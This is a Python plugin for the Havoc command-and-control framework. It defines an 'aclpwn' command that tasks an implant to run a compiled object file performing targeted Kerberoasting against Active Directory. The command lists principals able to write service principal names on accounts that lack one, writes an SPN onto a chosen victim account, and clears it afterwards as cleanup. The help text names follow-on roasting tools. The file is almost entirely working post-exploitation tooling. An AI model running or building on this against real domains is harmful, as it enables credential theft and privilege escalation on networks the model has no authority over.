from havoc import Demon, RegisterCommand, RegisterModule


_SUBCOMMANDS = {
    "list-spn-writers": (0, "list principals that can write SPN on each no-SPN user"),
    "set-spn":          (1, "write servicePrincipalName on a target"),
    "clear-spn":        (2, "clear servicePrincipalName on a target"),
}


def _parse_flags(param, flags):
    values = {name: spec[1] for name, spec in flags.items()}
    i = 0
    while i < len(param):
        p = param[i]
        matched = None
        for name in flags:
            if p == name or p.startswith(name + "="):
                matched = name
                break
        if matched is None:
            i += 1
            continue
        if p == matched:
            if i + 1 >= len(param):
                return values, f"flag {matched} requires a value"
            val = param[i + 1]
            i += 2
        else:
            val = p.split("=", 1)[1]
            i += 1
        values[matched] = val
    return values, None


def aclpwn_cmd(demonID, *param):
    demon  = Demon(demonID)
    packer = Packer()

    if not param:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
            "Usage: aclpwn <subcommand> [flags]\n"
            "Subcommands: " + ", ".join(_SUBCOMMANDS.keys()))
        return False

    sub = param[0]
    if sub not in _SUBCOMMANDS:
        demon.ConsoleWrite(demon.CONSOLE_ERROR,
                           f"unknown subcommand: {sub}\n"
                           f"valid: {', '.join(_SUBCOMMANDS.keys())}")
        return False
    mode, opname = _SUBCOMMANDS[sub]

    flags = {
        "--target": (str, ""),
        "--spn":    (str, ""),
        "--domain": (str, ""),
        "--user":   (str, ""),
        "--pass":   (str, ""),
    }
    values, err = _parse_flags(list(param[1:]), flags)
    if err:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, err)
        return False

    target = values["--target"]
    spn    = values["--spn"]
    domain = values["--domain"]
    user   = values["--user"]
    passw  = values["--pass"]
    rest = list(param[1:])
    force = 1 if "--force" in rest else 0
    noise = 1 if "--noise" in rest else 0

    if mode in (1, 2) and not target:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--target is required for this subcommand")
        return False
    if mode == 1 and not spn:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "--spn is required for set-spn")
        return False

    # trailing int carries either `force` (set-spn) or `noise` (list-spn-writers)
    trailing = noise if mode == 0 else force

    packer.addint(mode)
    packer.addstr(target)
    packer.addstr(spn)
    packer.addstr(domain)
    packer.addstr(user)
    packer.addstr(passw)
    packer.addint(trailing)

    if mode == 0:
        label = "(domain-wide, --noise)" if noise else "(domain-wide)"
    else:
        label = target
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK,
                                f"Tasked demon to {opname} {label}")
    demon.InlineExecute(TaskID, "go", "bin/aclpwn.x64.o", packer.getbuffer(), False)
    return TaskID


ACLPWN_HELP = (
    "Targeted-kerberoast primitives: inventory ACL edges over no-SPN users,\n"
    "then write / clear servicePrincipalName. Roasting itself is out of\n"
    "scope - use nanorobeus or the kerberoast BOF against the SPN once\n"
    "written.\n"
    "\n"
    "SUBCOMMANDS:\n"
    "  aclpwn list-spn-writers [--noise]\n"
    "      For each enabled user with EMPTY servicePrincipalName, print\n"
    "      every principal that holds a right allowing SPN write on that\n"
    "      target: GenericAll / GenericWrite / WriteDACL / WriteOwner /\n"
    "      WriteProperty(*) / WriteProperty(servicePrincipalName). Also\n"
    "      lists the owner (implicit WriteDACL). Domain-wide - NOT gated\n"
    "      on the current identity. Default principals (SYSTEM, Domain\n"
    "      Admins, BUILTIN\\Administrators, Account/Server/Print/Backup\n"
    "      Operators, Enterprise DCs, SELF, CREATOR OWNER, Everyone,\n"
    "      built-in Administrator, Schema/Enterprise Admins, DCs, GPO\n"
    "      Creator Owners) are suppressed unless --noise is passed.\n"
    "\n"
    "  aclpwn set-spn --target <DN|sAM> --spn <value> [--force]\n"
    "      Replace servicePrincipalName. Refuses if the attribute is already\n"
    "      populated unless --force is passed (destructive).\n"
    "\n"
    "  aclpwn clear-spn --target <DN|sAM>\n"
    "      Delete servicePrincipalName (cleanup after roasting).\n"
    "\n"
    "OPTIONAL (alternate credentials / target domain):\n"
    "  --domain <d>   NetBIOS or DNS domain; also selects DC.\n"
    "  --user <u>     LDAP bind username.\n"
    "  --pass <p>     LDAP bind password.\n"
    "\n"
    "EXAMPLES:\n"
    "  aclpwn list-spn-writers\n"
    "  aclpwn list-spn-writers --noise\n"
    "  aclpwn set-spn --target jnovoa --spn HTTP/bogus.corp.local\n"
    "  aclpwn clear-spn --target jnovoa\n"
)


RegisterCommand(aclpwn_cmd, "", "aclpwn",
                "Targeted-kerberoast: inventory ACL edges on no-SPN users and set/clear servicePrincipalName.",
                0,
                ACLPWN_HELP,
                "list-spn-writers")
